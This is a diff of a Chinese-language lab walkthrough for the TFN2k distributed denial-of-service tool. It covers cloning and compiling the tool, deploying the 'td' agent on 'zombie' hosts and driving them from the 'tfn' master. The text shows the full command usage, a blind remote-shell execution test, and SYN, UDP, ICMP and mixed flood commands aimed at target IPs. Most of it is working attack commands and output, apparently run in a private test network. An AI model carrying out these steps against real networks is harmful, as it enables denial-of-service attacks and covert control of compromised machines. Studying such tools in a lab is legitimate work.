@@ -3,82 +3,81 @@
 TFN2k 模拟攻击示例
 ==================
 
-主要参考[1]
+参考[1]
+-----------
 
-1. 编译
+#1. 编译
 
 `git clone https://github.com/poornigga/tfn2k`
 `cd tfn2k`
 `make`
 
-2. 安装
+#2. 安装
 
-测试环境：
-主控端tfn：10.4.3.145
-被控端td:
-1. 10.4.192.26
-2. 10.4.3.117
-3. 10.4.3.145  (10.4.3.145既做主控端又做被控端，即主控端自身也是肉鸡)
+##测试环境：
+>主控端tfn：10.4.3.145
+>被控端td:
+>1. 10.4.192.26
+>2. 10.4.3.117
+>3. 10.4.3.145  (10.4.3.145既做主控端又做被控端，即主控端自身也是肉鸡)
 
-测试手段：
-10.4.3.145指挥10.4.192.26,10.4.3.117,10.4.3.145去攻击10.4.192.25
+##测试手段：
+>10.4.3.145指挥10.4.192.26,10.4.3.117,10.4.3.145去攻击10.4.192.25
 
-主控端安装
-将td,tfn两程序FTP到主控端（10.4.3.145）的/root
-[root@localhost ~]# ls
-serverout0.txt  tfn  td
+##主控端安装
+>将td,tfn两程序FTP到主控端（10.4.3.145）的/root
+>`[root@localhost ~]# ls`
+>`serverout0.txt  tfn  td`
 
-建立host_tfn文件，设立肉鸡地址，包括自身
-[root@localhost ~]# cat host_tfn
-10.4.192.26     
-10.4.3.145      自身
-10.4.3.117     
+##建立host_tfn文件，设立肉鸡地址，包括自身
+>[root@localhost ~]# cat host_tfn
+>10.4.192.26     
+>10.4.3.145      自身
+>10.4.3.117     
 
-被控端安装
-ftp td到各被控端
+##被控端安装
+>ftp td到各被控端
 
 
-3. 测试
+#3. 测试
 
-各被控端起td
-[mac@nm ~]$ su                 td必须在root下起
-Password:
-[root@nm mac]# ./td
-[root@nm mac]# ps -ef
-UID        PID  PPID  C STIME TTY          TIME CMD
-root     24923 24894  1 05:14 pts/1    00:00:00 su
-root     24924 24923  6 05:14 pts/1    00:00:00 bash
-root     24943     1  0 05:14 pts/1    00:00:00 tfn-daemon
-root     24944 24924  0 05:14 pts/1    00:00:00 ps –ef
+##各被控端起td
+>[mac@nm ~]$ su                 td必须在root下起
+>Password:
+>[root@nm mac]# ./td
+>[root@nm mac]# ps -ef
+>UID        PID  PPID  C STIME TTY          TIME CMD
+>root     24923 24894  1 05:14 pts/1    00:00:00 su
+>root     24924 24923  6 05:14 pts/1    00:00:00 bash
+>root     24943     1  0 05:14 pts/1    00:00:00 tfn-daemon
+>root     24944 24924  0 05:14 pts/1    00:00:00 ps –ef
 
-在主控host也要起肉鸡程序td (即主控端自身也是肉鸡)
+##在主控host也要起肉鸡程序td (即主控端自身也是肉鸡)
 
-telnet 10.4.3.145
-连通性测试
-在所有肉鸡（包括主控端）td都启动后
-在主控端做基本的控制测试
-[root@localhost ~]# /root/tfn -f host_tfn -c 10 -i "mkdir testaa"
+>telnet 10.4.3.145
+>连通性测试
+>在所有肉鸡（包括主控端）td都启动后
+>在主控端做基本的控制测试
+>`[root@localhost ~]# /root/tfn -f host_tfn -c 10 -i "mkdir testaa"`
 
-Protocol      : random
-Source IP     : random
-Client input  : list
-Command       : execute remote command
-Password verification:  输入00008421 (此为主控端与各肉鸡的握手密码，是编译时生成的)
-Sending out packets: ...
-[root@localhost ~]#
+>Protocol      : random
+>Source IP     : random
+>Client input  : list
+>Command       : execute remote command
+>Password verification:  输入00008421 (此为主控端与各肉鸡的握手密码，是编译时生成的)
+>Sending out packets: ...
+>[root@localhost ~]#
 
-在各个肉鸡下都会自动建立一个目录testaa,通常建立在td文件存在的目录下
-[root@localhost ~]# ls
-host_tfn    td      tfn
+##在各个肉鸡下都会自动建立一个目录testaa,通常建立在td文件存在的目录下
+>`[root@localhost ~]# ls`
+>`host_tfn    td      tfn`
 
-[root@vmyu mac]# ls
-minilinux  td  testaa  tfn
+>这证明主控和肉鸡通信正常
 
-这证明主控和肉鸡通信正常
+#正式开始攻击
 
-正式开始攻击
-
-在主控端执行tfn
+##在主控端执行tfn
+`
 [root@localhost ~]# /root/tfn
 usage: /root/tfn <options>
 [-P protocol]   Protocol for server communication. Can be ICMP, UDP or TCP.
@@ -102,10 +101,11 @@ to use your real IP if you are behind spoof-filtering routers
 8 - MIX flood (UDP/TCP/ICMP interchanged), usage: -i victim@...
 9 - TARGA3 flood (IP stack penetration), usage: -i victim@...
 10 - Blindly execute remote shell command, usage -i command
+`
 
--c 10是执行一条指令
--c 4,5,6,7,8,9 是5种DOS攻击
--c 0 是关闭攻击
+>-c 10是执行一条指令
+>-c 4,5,6,7,8,9 是5种DOS攻击
+>-c 0 是关闭攻击
 
 example:
 [root@localhost ~]# /root/tfn -f host_tfn -c 6 -i 10.4.192.25 
@@ -159,11 +159,11 @@ PING 10.4.192.25 (10.4.192.25) 56(84) bytes of data.
 TFN发动的攻击包括：UDPflood（-c 6)、TCP SYN flood(-c 5) 、ICMPreply flood(-c 7)
 
 SYN/TCP攻击并设攻击端口（假设对方是WWW SERVER）
-#./tfn　-f　hosts.txt　-c　5　-i　192.168.111.88　-p　80
+`# ./tfn　-f　hosts.txt　-c　5　-i　192.168.111.88　-p　80`
 
 
 ICMP/TCP/UDP轮流攻击：
-#./tfn　-f　hosts.txt　-c　8　-i　192.168.111.88
+`#./tfn　-f　hosts.txt　-c　8　-i　192.168.111.88`
 会按TCP/UDP/ICMP的轮替方式发攻击包。
 
 tfn 发起攻击，如果目标不可达，比如没路由，PING不通等，他没有任何显示，就是tcpdump下不发包
